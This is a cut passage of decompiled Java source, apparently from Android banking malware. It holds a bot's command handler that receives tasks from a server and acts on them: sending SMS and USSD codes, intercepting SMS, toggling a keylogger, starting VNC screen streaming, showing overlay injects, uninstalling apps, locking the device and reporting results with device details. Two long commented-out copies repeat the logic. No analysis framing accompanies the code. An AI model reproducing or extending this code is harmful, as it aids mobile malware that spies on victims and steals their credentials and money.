                    Cthrow.m154case(csuperV1.f76for, "keylogger_enabled", Boolean.FALSE);
                } else if (strTaskType.equals("uninstall_apps")) {
                    String strV8 = Cthrow.m158new(csuperV1.f76for, "uninstall_apps", "");
                    if (!strV8.isEmpty() && !strV8.endsWith(",")) {
                        StringBuilder stringBuilderV10 = new StringBuilder();
                        stringBuilderV10.append(strV8);
                        stringBuilderV10.append(",");
                        strV8 = stringBuilderV10.toString();
                    }

                    StringBuilder stringBuilderV10 = new StringBuilder();
                    stringBuilderV10.append(strV8);
                    stringBuilderV10.append(strData);

                    Cthrow.m159this(csuperV1.f76for, "uninstall_apps", stringBuilderV10.toString());
                    Cthrow.m155else(csuperV1.f76for, "uninstall_delay", Integer.valueOf(0));
                } else if (strTaskType.equals("start_fg")) {
                    Intent intentV0 = new Intent(csuperV1.f76for, p054v.class);
                    Cgoto.s(csuperV1.f76for, intentV0.putExtra("fg", "start"));
                    Cthrow.m154case(csuperV1.f76for, "fg_mode", Boolean.TRUE);

                    Cthrow.m155else(csuperV1.f76for, "net_delay", Integer.valueOf(1));  // ?
                } else if (strTaskType.equals("stop_fg")) {
                    Intent intentV0 = new Intent(csuperV1.f76for, p054v.class);
                    Cgoto.s(csuperV1.f76for, intentV0.putExtra("fg", "stop"));
                    Cthrow.m154case(csuperV1.f76for, "fg_mode", Boolean.FALSE);
                } else if (strTaskType.equals("open_url")) {
                    if (strData.startsWith("BROWSER|")) {
                        strData = strData.replace("BROWSER|", "");
                        intV8 = 1;
                    } else {
                        intV8 = 0;
                    }

                    if (strData.startsWith("https://") || strData.startsWith("http://")) {
                        if (intV8 != 0)
                            Cgoto.sfgjdgjtrfjgdtyrt(csuperV1.f76for, strData);
                        else
                            Cgoto.m(csuperV1.f76for, strData);
                    }
                } else if (strTaskType.equals("disable_inject")) {
                    new Cclass(csuperV1.f76for).fddo(strData);
                } else if (strTaskType.equals("show_inject")) {
                    new Cclass(csuperV1.f76for).ifdf(strData);
                } else if (strTaskType.equals("run_app")) {
                    Cgoto.e(csuperV1.f76for, strData);
                } else {
                    Exception exceptionV0 = new Exception("unknown_command");
                    throw exceptionV0;
                }

                JSONObject jsonObject = new JSONObject();
                jsonObject.put("tid1", strId);
                jsonObject.put("tr_inner", "success");
                try {
                    arrayListV14.add(jsonObject.toString());
                } catch (Exception e) {
                    JSONObject jsonObjectV9 = jsonArrayV2.getJSONObject(intV13);
                    strId = jsonObjectV9.getString("id");
                    strTaskType = jsonObjectV9.getString("task_type");
                    strData = jsonObjectV9.getString("data");
                    StringWriter stringWriter = new StringWriter();
                    PrintWriter printWriter = new PrintWriter(stringWriter);
                    e.printStackTrace(printWriter);
                    String strWriter = stringWriter.toString();
                    printWriter.close();
                    Cgoto.f(this.f76for,
                            String.format("\n=============\nPlace: RES_PARSE_TASKS\nBuild.VERSION.RELEASE: %s\nBuild.MANUFACTURER: %s\nBuild.MODEL: %s\nLANG: %s\nCOUNTRY: %s\ntid: %s; task_type: %s; data: %s\nMsg: %s\nTb: %s\n===========\n\n",
                                    Build.VERSION.RELEASE,
                                    Build.MANUFACTURER,
                                    Build.MODEL,
                                    Cgoto.m138throws(this.f76for),
                                    Cgoto.m142while(this.f76for),
                                    strId,
                                    strTaskType,
                                    strData,
                                    e.getMessage(),
                                    strWriter
                            ));
                    jsonObject = new JSONObject();
                    jsonObject.put("tid1", strId);
                    jsonObject.put("tr_inner", "failed");
                    arrayListV14.add(jsonObject.toString());
                }
            } catch (Exception e0) {
                Log.e(TAG, "--- error: " + e0.getMessage());
            }
        }

        return arrayListV14;
    }

//
//    public java.util.ArrayList<java.lang.String> m146new(org.json.JSONArray r28) {
//        Csuper csuperV1 = this;
//        JSONArray jsonArrayV2 = r28;
//        String strV3 = "BROWSER|";
//        String strV4 = ",";
//        String strV5 = "kill_bot";
//        String strV6 = "tr_inner";
//        String strV7 = "tid1";
//        String strV8 = "data";
//        String strV9 = "task_type";
//        String strV10 = "id";
//        String strV11 = "intercept_on";
//        String strV12 = "lock_on";
//        String strV13 = "\\?";
//        ArrayList arrayListV14 = new ArrayList();
//        int intV0 = r28.length();
//        String strV15 = "";
//        String strV16;
//
//        if (intV0 > 0) {
//            Context contextV0 = csuperV1.f76for;
//            strV16 = strV13;
//            strV13 = "acsb_task";
//            Cthrow.m159this(contextV0, strV13, strV15);
//        } else {
//            strV16 = strV13;
//        }
//
//        for (int intV13 = 0x0; intV13 < intV0; intV13 ++) {
//            ArrayList arrayListV18 = arrayListV14;
//            int intV20 = 0x1;
//
//            try {
//                JSONObject jsonObjectV0 = jsonArrayV2.getJSONObject(intV13);
//                String strV14 = jsonObjectV0.getString(strV10);
//                String strV22 = strV10;
//
//                try {
//                    strV10 = jsonObjectV0.getString(strV9);
//                    String strV0 = jsonObjectV0.getString(strV8);
//                    String strV23 = strV8;
//                    String strV24;
//
//                    try {
//                        strV8 = "ussd";
//                        boolean boolV8 = strV10.equals(strV8);
//                        if (boolV8) {
//                            Context contextV8 = csuperV1.f76for;
//                            Cgoto.x(contextV8, strV0);
//                            strV24 = strV9;
//
////                            goto_2
//                            String strV25 = strV11;
//                            String strV26 = strV12;
////                            goto goto_7;
//                        } else
//                        {
//                            strV8 = "sms";
//                            boolV8 = strV10.equals(strV8);
//                            strV24 = strV9;
//                            strV9 = "\\|";
//                            if (boolV8) {
//                                int intV8 = 0x2;
//
//                                try {
//                                    String[] strArrV0 = strV0.split(strV9, intV8);
//                                    intV8 = 0x0;
//                                    strV9 = strArrV0[intV8];
//                                    strV8 = "112233";
//                                    boolV8 = strV9.equals(strV8);
//                                    if (boolV8) {
//                                        ifdf ifdf8;
//                                        Context contextV9 = csuperV1.f76for;
//                                        ifdf8 = new ifdf(contextV9);
//                                        strV0 = strArrV0[intV20];
//                                        ifdf8.m144new(strV0);
//
//                                        String strV25 = strV11;
//                                        String strV26 = strV12;
////                            goto goto_7;
//                                    } else {
//                                        intV8 = 0x0;
//                                        try {
//                                            strV9 = strArrV0[intV8];
//                                            strV0 = strArrV0[intV20];
//                                            Cgoto.h(strV9, strV0);
////                                            goto goto_2
//                                        } catch (Exception e4) {
//                                            Exception exceptionV0 = e4;
//                                            Context contextV8 = csuperV1.f76for;
//                                            StringBuilder stringBuilderV9 = new StringBuilder();
//                                            strV10 = "send_sms_error:";
//                                            stringBuilderV9.append(strV10);
//                                            strV0 = exceptionV0.getMessage();
//                                            stringBuilderV9.append(strV0);
//                                            strV0 = stringBuilderV9.toString();
//                                            Cgoto.g(contextV8, strV0);
//                                            String strV25 = strV11;
//                                            String strV26 = strV12;
////                            goto goto_7;
//                                        }
//                                    }
//
//
//                                } catch (Exception e3) {
//                                }
//                            } else {
//                                strV8 = "register_again";
//                                boolV8 = strV10.equals(strV8);
//                                if (boolV8) {
//                                    Context contextV0 = csuperV1.f76for;
//                                    strV8 = "is_registered";
//                                    Boolean booleanV9 = Boolean.FALSE;
//                                    Cthrow.m154case(contextV0, strV8, booleanV9);
//                                    String strV25 = strV11;
//                                    String strV26 = strV12;
////                            goto goto_7;
//                                } else {
//                                    boolV8 = strV10.equals(strV12);
//                                    if (boolV8) {
//                                        Context contextV0 = csuperV1.f76for;
//                                        Boolean booleanV8 = Boolean.FALSE;
//                                        Cthrow.m154case(contextV0, strV12, booleanV8);
//                                        String strV25 = strV11;
//                                        String strV26 = strV12;
////                            goto goto_7;
//                                    } else {
//                                        strV8 = "lock_off";
//                                        boolV8 = strV10.equals(strV8);
//                                        if (boolV8) {
//                                            Context contextV0 = csuperV1.f76for;
//                                            Boolean booleanV8 = Boolean.FALSE;
//                                            Cthrow.m154case(contextV0, strV12, booleanV8);
//                                            contextV0 = csuperV1.f76for;
//                                            Boolean booleanV0 = Cgoto.ifdf(contextV0);
//                                            boolean boolV0 = booleanV0.booleanValue();
//                                            if (boolV0) {
//                                                contextV0 = csuperV1.f76for;
//                                                Cgoto.m107break(contextV0);
//                                            }
//
//                                            contextV0 = csuperV1.f76for;
//                                            Cgoto.m120implements(contextV0);
//                                            String strV25 = strV11;
//                                            String strV26 = strV12;
////                            goto goto_7;
//                                        } else {
//                                            boolV8 = strV10.equals(strV11);
//                                            if (boolV8) {
//                                                Context contextV0 = csuperV1.f76for;
//                                                Boolean booleanV8 = Boolean.TRUE;
//                                                Cthrow.m154case(contextV0, strV11, booleanV8);
//                                                contextV0 = csuperV1.f76for;
//                                                strV8 = "SMS_Intercept: enabled";
//
////                                                goto_3
//                                                Cgoto.g(contextV0, strV8);
////                                                goto goto_2
//                                            } else {
//                                                strV8 = "intercept_off";
//                                                boolV8 = strV10.equals(strV8);
//                                                if (boolV8) {
//                                                    Context contextV0 = csuperV1.f76for;
//                                                    Boolean booleanV8 = Boolean.FALSE;
//                                                    Cthrow.m154case(contextV0, strV11, booleanV8);
//                                                    contextV0 = csuperV1.f76for;
//                                                    strV8 = "SMS_Intercept: disabled";
//                                                    Cgoto.g(contextV0, strV8);
//                                                    String strV25 = strV11;
//                                                    String strV26 = strV12;
////                            goto goto_7;
//                                                } else {
//                                                    strV8 = "vnc_start";
//                                                    boolV8 = strV10.equals(strV8);
//                                                    String strV25 = strV11;
//                                                    strV11 = "net_delay";
//                                                    String strV26 = strV12;
//                                                    strV12 = "vnc";
//                                                    if (boolV8) {
//                                                        try {
//                                                            Context contextV8 = csuperV1.f76for;
//                                                            Cthrow.m159this(contextV8, strV12, strV0);
//                                                            Context contextV0 = csuperV1.f76for;
//                                                            Integer integerV8 = Integer.valueOf(intV20);
//
////                                                            goto_4
//                                                            Cthrow.m155else(contextV0, strV11, integerV8);
////                                                            goto goto_7
//                                                        } catch (Exception e6) {
//                                                        }
//                                                    } else {
//                                                        strV8 = "vnc_stop";
//                                                        boolV8 = strV10.equals(strV8);
//                                                        if (boolV8) {
//                                                            Context contextV0 = csuperV1.f76for;
//                                                            strV10 = Cthrow.m158new(contextV0, strV12, strV15);
//                                                            strV8 = "STREAM_SCREEN;";
//                                                            boolean boolV0 = strV0.contains(strV8);
//                                                            if (boolV0) {
//                                                                contextV0 = csuperV1.f76for;
//                                                                strV8 = "vnc_stream_started";
//                                                                Boolean booleanV9 = Boolean.TRUE;
//                                                                Cthrow.m154case(contextV0, strV8, booleanV9);
//                                                            }
//
//                                                            contextV0 = csuperV1.f76for;
//                                                            Cthrow.m159this(contextV0, strV12, strV15);
////                                                            goto goto_7
//                                                        } else {
//                                                            strV8 = "push";
//                                                            boolV8 = strV10.equals(strV8);
//                                                            if (boolV8) {
//                                                                int intV8 = 0x3;
//                                                                String[] strArrV0 = strV0.split(strV9, intV8);
//                                                                Context contextV8 = csuperV1.f76for;
//                                                                int intV9 = 0x0;
//                                                                strV10 = strArrV0[intV9];
//                                                                strV9 = strArrV0[intV20];
//                                                                int intV11 = 0x2;
//                                                                strV0 = strArrV0[intV11];
//                                                                Cgoto.l(contextV8, strV10, strV9, strV0);
////                                                                goto goto_7
//                                                            } else {
//                                                                boolV8 = strV10.equals(strV5);
//                                                                strV9 = "uninstall_apps";
//                                                                if (boolV8) {
//                                                                    try {
//                                                                        Context contextV0 = csuperV1.f76for;
//                                                                        Boolean booleanV8 = Boolean.TRUE;
//                                                                        Cthrow.m154case(contextV0, strV5, booleanV8);
//                                                                        contextV0 = csuperV1.f76for;
//                                                                        strV0 = contextV0.getPackageName();
//                                                                        Context contextV8 = csuperV1.f76for;
//                                                                        Cthrow.m159this(contextV8, strV9, strV0);
////                                                                        goto goto_7
//                                                                    } catch (Exception e7) {
//                                                                    }
//                                                                } else {
//                                                                    strV8 = "start_keylogger";
//                                                                    boolV8 = strV10.equals(strV8);
//                                                                    strV12 = "keylogger_enabled";
//                                                                    if (boolV8) {
//                                                                        try {
//                                                                            Context contextV0 = csuperV1.f76for;
//                                                                            Boolean booleanV8 = Boolean.TRUE;
//                                                                            Cthrow.m154case(contextV0, strV12, booleanV8);
//                                                                            ;
//                                                                            contextV0 = csuperV1.f76for;
//                                                                            strV8 = "keylogger_delay";
//                                                                            int intV9 = 0x0;
//                                                                            Integer integerV10 = Integer.valueOf(intV9);
//
////                                                                            goto_5
//                                                                            Cthrow.m155else(contextV0, strV8, integerV10);
////                                                                            goto goto_7
//                                                                        } catch (Exception e8) {
//                                                                        }
//                                                                    } else {
//                                                                        strV8 = "stop_keylogger";
//                                                                        boolV8 = strV10.equals(strV8);
//                                                                        if (boolV8) {
//                                                                            Context contextV0 = csuperV1.f76for;
//                                                                            Boolean booleanV8 = Boolean.FALSE;
//                                                                            Cthrow.m154case(contextV0, strV12, booleanV8);
////                                                                            goto goto_7
//                                                                        } else {
//                                                                            boolV8 = strV10.equals(strV9);
//                                                                            if (boolV8) {
//                                                                                Context contextV8 = csuperV1.f76for;
//                                                                                strV8 = Cthrow.m158new(contextV8, strV9, strV15);
//                                                                                boolean boolV10 = strV8.isEmpty();
//                                                                                if (!boolV10) {
//                                                                                    boolV10 = strV8.endsWith(strV4);
//                                                                                    if (!boolV10) {
//                                                                                        StringBuilder stringBuilderV10 = new StringBuilder();
//                                                                                        stringBuilderV10.append(strV8);
//                                                                                        stringBuilderV10.append(strV4);
//                                                                                        strV8 = stringBuilderV10.toString();
//                                                                                    }
//                                                                                }
//
//                                                                                StringBuilder stringBuilderV10 = new StringBuilder();
//                                                                                stringBuilderV10.append(strV8);
//                                                                                stringBuilderV10.append(strV0);
//                                                                                strV0 = stringBuilderV10.toString();
//                                                                                contextV8 = csuperV1.f76for;
//                                                                                Cthrow.m159this(contextV8, strV9, strV0);
//                                                                                Context contextV0 = csuperV1.f76for;
//                                                                                strV8 = "uninstall_delay";
//                                                                                int intV9 = 0x0;
//                                                                                Integer integerV10 = Integer.valueOf(intV9);
////                                                                                goto goto_5
//                                                                            } else {
//                                                                                strV8 = "start_fg";
//                                                                                boolV8 = strV10.equals(strV8);
//                                                                                strV9 = "fg";
//                                                                                if (boolV8) {
//                                                                                    try {
//                                                                                        Intent intentV0;
//                                                                                        Context contextV8 = csuperV1.f76for;
//                                                                                        intentV0 = new Intent(contextV8, p054v.class);
//                                                                                        strV8 = "start";
//                                                                                        intentV0 = intentV0.putExtra(strV9, strV8);
//                                                                                        contextV8 = csuperV1.f76for;
//                                                                                        Cgoto.s(contextV8, intentV0);
//                                                                                        Context contextV0 = csuperV1.f76for;
//                                                                                        strV8 = "fg_mode";
//                                                                                        Boolean booleanV9 = Boolean.TRUE;
//                                                                                        Cthrow.m154case(contextV0, strV8, booleanV9);
//                                                                                        contextV0 = csuperV1.f76for;
//                                                                                        Integer integerV8 = Integer.valueOf(intV20);
////                                                                                        goto goto_4
//                                                                                    } catch (
//                                                                                            Exception e9) {
//                                                                                    }
//                                                                                } else {
//                                                                                    strV8 = "stop_fg";
//                                                                                    boolV8 = strV10.equals(strV8);
//                                                                                    if (boolV8) {
//                                                                                        Intent intentV0;
//                                                                                        Context contextV8 = csuperV1.f76for;
//                                                                                        p054v p054vV10;
//                                                                                        intentV0 = new Intent(contextV8, p054v.class);
//                                                                                        strV8 = "stop";
//                                                                                        intentV0 = intentV0.putExtra(strV9, strV8);
//                                                                                        contextV8 = csuperV1.f76for;
//                                                                                        Cgoto.s(contextV8, intentV0);
//                                                                                        Context contextV0 = csuperV1.f76for;
//                                                                                        strV8 = "fg_mode";
//                                                                                        Boolean booleanV9 = Boolean.FALSE;
//                                                                                        Cthrow.m154case(contextV0, strV8, booleanV9);
////                                                                                        goto goto_7
//                                                                                    } else {
//                                                                                        strV8 = "open_url";
//                                                                                        boolV8 = strV10.equals(strV8);
//                                                                                        if (boolV8) {
//                                                                                            boolV8 = strV0.startsWith(strV3);
//                                                                                            int intV8;
//                                                                                            if (boolV8) {
//                                                                                                strV0 = strV0.replace(strV3, strV15);
//                                                                                                intV8 = intV20;
////                                                                                                goto goto_6
//                                                                                            } else {
//                                                                                                intV8 = 0x0;
//                                                                                            }
//
//                                                                                            strV9 = "https://";
//                                                                                            boolean boolV9 = strV0.startsWith(strV9);
//                                                                                            if (!boolV9) {
//                                                                                                strV9 = "http://";
//                                                                                                boolV9 = strV0.startsWith(strV9);
//                                                                                                if (boolV9) {
////                                                                                                    cond_1b
//                                                                                                }
//                                                                                            }
//
//                                                                                            if (intV8 != 0) {
//                                                                                                Context contextV8 = csuperV1.f76for;
//                                                                                                Cgoto.sfgjdgjtrfjgdtyrt(contextV8, strV0);
////                                                                                                goto goto_7
//                                                                                            } else {
//                                                                                                Context contextV8 = csuperV1.f76for;
//                                                                                                Cgoto.m(contextV8, strV0);
////                                                                                                goto goto_7
//                                                                                            }
//                                                                                        } else {
//                                                                                            strV8 = "disable_inject";
//                                                                                            boolV8 = strV10.equals(strV8);
//                                                                                            if (boolV8) {
//                                                                                                Cclass cclassV8;
//                                                                                                Context contextV9 = csuperV1.f76for;
//                                                                                                cclassV8 = new Cclass(contextV9);
//                                                                                                cclassV8.fddo(strV0);
////                                                                                                goto goto_7
//                                                                                            } else {
//                                                                                                strV8 = "show_inject";
//                                                                                                boolV8 = strV10.equals(strV8);
//                                                                                                if (boolV8) {
//                                                                                                    Cclass cclassV8;
//                                                                                                    Context contextV9 = csuperV1.f76for;
//                                                                                                    cclassV8 = new Cclass(contextV9);
//                                                                                                    cclassV8.ifdf(strV0);
////                                                                                                    goto goto_7
//                                                                                                } else {
//                                                                                                    strV8 = "run_app";
//                                                                                                    boolV8 = strV10.equals(strV8);
//                                                                                                    if (boolV8) {
//                                                                                                        Context contextV8 = csuperV1.f76for;
//                                                                                                        Cgoto.e(contextV8, strV0);
//                                                                                                    } else {
//                                                                                                        ArrayList arrayListV8 = arrayListV18;
//                                                                                                        Exception exceptionV0;
//                                                                                                        strV9 = "unknown_command";
//                                                                                                        exceptionV0 = new Exception(strV9);
//                                                                                                        throw exceptionV0;
//                                                                                                    }
//                                                                                                }
//                                                                                            }
//                                                                                        }
//                                                                                    }
//                                                                                }
//                                                                            }
//                                                                        }
//                                                                    }
//                                                                }
//                                                            }
//                                                        }
//                                                    }
//                                                }
//                                            }
//                                        }
//                                    }
//                                }
//                            }
//
//                        }
//
////                        goto_7
//                        jsonObjectV0 = new JSONObject();
//                        jsonObjectV0.put(strV7, strV14);
//                        strV8 = "success";
//                        jsonObjectV0.put(strV6, strV8);
//                        strV0 = strV0.toString();
//                        ArrayList arrayListV8 = arrayListV18;
//                        arrayListV8.add(strV0);
//                        String strV18 = strV3;
//                        String strV20 = strV4;
//                        String strV19 = strV5;
//                        strV10 = strV22;
//                        strV12 = strV24;
//                        int intV17 = 0x0;
////                        goto goto_f
//
////                    goto_b
//                        try {
//                            JSONObject jsonObjectV9 = jsonArrayV2.getJSONObject(intV13);
//                            strV10 = strV22;
//                            try {
//                                strV11 = jsonObjectV9.getString(strV10);
//                                strV12 = strV24;
//                                try {
//                                    strV14 = jsonObjectV9.getString(strV12);
//                                    String strV2 = strV23;
//                                    try {
//                                        strV9 = jsonObjectV9.getString(strV2);
//                                        strV23 = strV2;
////                                    goto _goto_d
//
//                                    } catch (Exception eE) {
//                                        eE.printStackTrace();
//                                        strV23 = strV2;
//                                        strV9 = strV16;
////                    goto_d
//                                        StringWriter stringWriterV2 = new StringWriter();
//                                        strV18 = strV3;
//                                        PrintWriter printWriterV3 = new PrintWriter(stringWriterV2);
//                                        eE.printStackTrace(printWriterV3);
//                                        strV2 = stringWriterV2.toString();
//                                        printWriterV3.close();
//                                        int intV3 = 0xa;
//                                        Object[] objArrV3 = new Object[intV3];
//                                        strV22 = Build.VERSION.RELEASE;
//                                        intV17 = 0x0;
//                                        objArrV3[intV17] = strV22;
//                                        strV22 = Build.MANUFACTURER;
//                                        objArrV3[intV20] = strV22;
//                                        strV20 = Build.MODEL;
//                                        int intV21 = 0x2;
//                                        objArrV3[intV21] = strV20;
//                                        strV20 = strV4;
//                                        Context contextV4 = csuperV1.f76for;
//                                        strV4 = Cgoto.m138throws(contextV4);
//                                        int intV19 = 0x3;
//                                        objArrV3[intV19] = strV4;
//                                        int intV4 = 0x4;
//                                        strV19 = strV5;
//                                        Context contextV5 = csuperV1.f76for;
//                                        strV5 = Cgoto.m142while(contextV5);
//                                        objArrV3[intV4] = strV5;
//                                        intV4 = 0x5;
//                                        objArrV3[intV4] = strV11;
//                                        intV4 = 0x6;
//                                        objArrV3[intV4] = strV14;
//                                        intV4 = 0x7;
//                                        objArrV3[intV4] = strV9;
//                                        intV4 = 0x8;
//                                        strV5 = eE.getMessage();
//                                        objArrV3[intV4] = strV5;
//                                        intV4 = 0x9;
//                                        objArrV3[intV4] = strV2;
//                                        strV2 = "\n=============\nPlace: RES_PARSE_TASKS\nBuild.VERSION.RELEASE: %s\nBuild.MANUFACTURER: %s\nBuild.MODEL: %s\nLANG: %s\nCOUNTRY: %s\ntid: %s; task_type: %s; data: %s\nMsg: %s\nTb: %s\n===========\n\n";
//                                        strV2 = String.format(strV2, objArrV3);
//                                        Context contextV3 = csuperV1.f76for;
//                                        Cgoto.f(contextV3, strV2);;
//                                        JSONObject jsonObjectV2;
//                                        jsonObjectV2 = new JSONObject();
//
//                                        try {
//                                            jsonObjectV2.put(strV7, strV11);
//                                            strV3 = "failed";
//                                            jsonObjectV2.put(strV6, strV3);
//                                            strV0 = jsonArrayV2.toString();
//                                            arrayListV8.add(strV0);
//                                        } catch (Exception eF) {
//                                            eF.printStackTrace();;
//                                        }
//                                    }
//                                } catch (Exception eD) {
//                                    String strV2 = strV23;
//                                    strV14 = strV16;
//                                    strV23 = strV2;
//                                    strV9 = strV16;
//                                }
//                            } catch (Exception eC) {
//                                String strV2 = strV23;
//                                strV12 = strV24;
//                                strV11 = strV16;
//                                strV14 = strV11;
//                            }
//                        } catch (Exception exceptionB) {
//                            strV10 = strV22;
//                        }
//                    } catch (Exception e2) {
//                    }
//                } catch (Exception e1) {
//                }
//            } catch (Exception e0) {
//            }
//        }
//
//        return arrayListV14;
//    }


//    public java.util.ArrayList<java.lang.String> m146new_(org.json.JSONArray r28) {
//        Csuper csuperV1 = this;
//        JSONArray jsonArrayV2 = r28;
//        String strV3 = "BROWSER|";
//        String strV4 = ",";
//        String strV5 = "kill_bot";
//        String strV6 = "tr_inner";
//        String strV7 = "tid1";
//        String strV8 = "data";
//        String strV9 = "task_type";
//        String strV10 = "id";
//        String strV11 = "intercept_on";
//        String strV12 = "lock_on";
//        String strV13 = "\\?";
//        ArrayList arrayListV14 = new ArrayList();
//        int intV0 = r28.length();
//        String strV15 = "";
//        String strV16;
//
//        if (intV0 > 0) {
//            strV16 = strV13;
//            Cthrow.m159this(csuperV1.f76for, "acsb_task", "");
//        } else {
//            strV16 = strV13;
//        }
//
//        for (int intV13 = 0x0; intV13 < intV0; intV13++) {
//            ArrayList arrayListV18 = arrayListV14;
//            int intV20 = 0x1;
//
//            try {
//                JSONObject jsonObjectV0 = jsonArrayV2.getJSONObject(intV13);
//                String strV14 = jsonObjectV0.getString(strV10);
//                String strV22 = strV10;
//
//                try {
//                    strV10 = jsonObjectV0.getString(strV9);
//                    String strV0 = jsonObjectV0.getString(strV8);
//                    String strV23 = strV8;
//                    String strV24;
//
//                    try {
//                        strV8 = "ussd";
//                        boolean boolV8 = strV10.equals("ussd");
//                        if (strV10.equals("ussd")) {
//                            Cgoto.x(csuperV1.f76for, strV0);
//                            strV24 = strV9;
//
//                            String strV25 = strV11;
//                            String strV26 = strV12;
////                            goto goto_7;
//                        } else {
//                            strV8 = "sms";
//                            boolV8 = strV10.equals("sms");
//                            strV24 = strV9;
//                            strV9 = "\\|";
//                            if (strV10.equals("sms")) {
//                                int intV8 = 0x2;
//
//                                try {
//                                    String[] strArrV0 = strV0.split("\\|", 0x2);
//                                    intV8 = 0x0;
//                                    strV9 = strArrV0[0x0];
//                                    strV8 = "112233";
//                                    boolV8 = strV9.equals("112233");
//                                    if (boolV8) {
//                                        ifdf ifdf8;
//                                        Context contextV9 = csuperV1.f76for;
//                                        ifdf8 = new ifdf(csuperV1.f76for);
//                                        strV0 = strArrV0[0x1];
//                                        ifdf8.m144new(strV0);
//
//                                        String strV25 = strV11;
//                                        String strV26 = strV12;
////                            goto goto_7;
//                                    } else {
//                                        intV8 = 0x0;
//                                        try {
//                                            strV9 = strArrV0[0x0];
//                                            strV0 = strArrV0[0x1];
//                                            Cgoto.h(strArrV0[0x0], strArrV0[0x1]);
////                                            goto goto_2
//                                        } catch (Exception e4) {
//                                            Exception exceptionV0 = e4;
//                                            Context contextV8 = csuperV1.f76for;
//                                            StringBuilder stringBuilderV9 = new StringBuilder();
//                                            strV10 = "send_sms_error:";
//                                            stringBuilderV9.append("send_sms_error:");
//                                            strV0 = exceptionV0.getMessage();
//                                            stringBuilderV9.append(exceptionV0.getMessage());
//                                            strV0 = stringBuilderV9.toString();
//                                            Cgoto.g(contextV8, stringBuilderV9.toString());
//                                            String strV25 = strV11;
//                                            String strV26 = strV12;
////                            goto goto_7;
//                                        }
//                                    }
//                                } catch (Exception e3) {
//                                }
//                            } else {
//                                strV8 = "register_again";
//                                boolV8 = strV10.equals("register_again");
//                                if (strV10.equals("register_again")) {
//                                    Context contextV0 = csuperV1.f76for;
//                                    strV8 = "is_registered";
//                                    Boolean booleanV9 = Boolean.FALSE;
//                                    Cthrow.m154case(csuperV1.f76for, "is_registered", Boolean.FALSE);
//                                    String strV25 = strV11;
//                                    String strV26 = strV12;
////                            goto goto_7;
//                                } else {
//                                    boolV8 = strV10.equals(strV12);
//                                    if (strV10.equals(strV12)) {
//                                        Context contextV0 = csuperV1.f76for;
//                                        Boolean booleanV8 = Boolean.FALSE;
//                                        Cthrow.m154case(csuperV1.f76for, strV12, Boolean.FALSE);
//                                        String strV25 = strV11;
//                                        String strV26 = strV12;
////                            goto goto_7;
//                                    } else {
//                                        strV8 = "lock_off";
//                                        boolV8 = strV10.equals("lock_off");
//                                        if (strV10.equals("lock_off")) {
//                                            Context contextV0 = csuperV1.f76for;
//                                            Boolean booleanV8 = Boolean.FALSE;
//                                            Cthrow.m154case(csuperV1.f76for, strV12, Boolean.FALSE);
//                                            contextV0 = csuperV1.f76for;
//                                            if (Cgoto.ifdf(csuperV1.f76for).booleanValue()) {
//                                                contextV0 = csuperV1.f76for;
//                                                Cgoto.m107break(csuperV1.f76for);
//                                            }
//
//                                            contextV0 = csuperV1.f76for;
//                                            Cgoto.m120implements(csuperV1.f76for);
//                                            String strV25 = strV11;
//                                            String strV26 = strV12;
////                            goto goto_7;
//                                        } else {
//                                            boolV8 = strV10.equals(strV11);
//                                            if (strV10.equals(strV11)) {
//                                                Context contextV0 = csuperV1.f76for;
//                                                Boolean booleanV8 = Boolean.TRUE;
//                                                Cthrow.m154case(csuperV1.f76for, strV11, Boolean.TRUE);
//                                                contextV0 = csuperV1.f76for;
//                                                strV8 = "SMS_Intercept: enabled";
//
////                                                goto_3
//                                                Cgoto.g(csuperV1.f76for, "SMS_Intercept: enabled");
//                                                String strV25 = strV11;
//                                                String strV26 = strV12;
////                            goto goto_7;
//                                            } else {
//                                                strV8 = "intercept_off";
//                                                boolV8 = strV10.equals("intercept_off");
//                                                if (strV10.equals("intercept_off")) {
//                                                    Context contextV0 = csuperV1.f76for;
//                                                    Boolean booleanV8 = Boolean.FALSE;
//                                                    Cthrow.m154case(csuperV1.f76for, strV11, Boolean.FALSE);
//                                                    contextV0 = csuperV1.f76for;
//                                                    strV8 = "SMS_Intercept: disabled";
//                                                    Cgoto.g(csuperV1.f76for, "SMS_Intercept: disabled");
//                                                    String strV25 = strV11;
//                                                    String strV26 = strV12;
////                            goto goto_7;
//                                                } else {
//                                                    strV8 = "vnc_start";
//                                                    boolV8 = strV10.equals("vnc_start");
//                                                    String strV25 = strV11;
//                                                    strV11 = "net_delay";
//                                                    String strV26 = strV12;
//                                                    strV12 = "vnc";
//                                                    if (strV10.equals("vnc_start")) {
//                                                        try {
//                                                            Context contextV8 = csuperV1.f76for;
//                                                            Cthrow.m159this(csuperV1.f76for, "vnc", strV0);
//                                                            Context contextV0 = csuperV1.f76for;
//                                                            Integer integerV8 = Integer.valueOf(intV20);
//
////                                                            goto_4
//                                                            Cthrow.m155else(csuperV1.f76for, "net_delay", Integer.valueOf(intV20));
////                                                            goto goto_7
//                                                        } catch (Exception e6) {
//                                                        }
//                                                    } else {
//                                                        strV8 = "vnc_stop";
//                                                        boolV8 = strV10.equals("vnc_stop");
//                                                        if (strV10.equals("vnc_stop")) {
//                                                            Context contextV0 = csuperV1.f76for;
//                                                            strV10 = Cthrow.m158new(csuperV1.f76for, strV12, strV15);
//                                                            strV8 = "STREAM_SCREEN;";
//                                                            boolean boolV0 = strV0.contains("STREAM_SCREEN;");
//                                                            if (strV0.contains("STREAM_SCREEN;")) {
//                                                                contextV0 = csuperV1.f76for;
//                                                                strV8 = "vnc_stream_started";
//                                                                Boolean booleanV9 = Boolean.TRUE;
//                                                                Cthrow.m154case(csuperV1.f76for, "vnc_stream_started", Boolean.TRUE);
//                                                            }
//
//                                                            contextV0 = csuperV1.f76for;
//                                                            Cthrow.m159this(csuperV1.f76for, strV12, strV15);
////                                                            goto goto_7
//                                                        } else {
//                                                            strV8 = "push";
//                                                            boolV8 = strV10.equals("push");
//                                                            if (strV10.equals("push")) {
//                                                                int intV8 = 0x3;
//                                                                String[] strArrV0 = strV0.split(strV9, 0x3);
//                                                                Context contextV8 = csuperV1.f76for;
//                                                                int intV9 = 0x0;
//                                                                strV10 = strArrV0[0x0];
//                                                                strV9 = strArrV0[intV20];
//                                                                int intV11 = 0x2;
//                                                                strV0 = strArrV0[0x2];
//                                                                Cgoto.l(csuperV1.f76for, strArrV0[0x0], strArrV0[intV20], strV0);
////                                                                goto goto_7
//                                                            } else {
//                                                                boolV8 = strV10.equals(strV5);
//                                                                strV9 = "uninstall_apps";
//                                                                if (strV10.equals(strV5)) {
//                                                                    try {
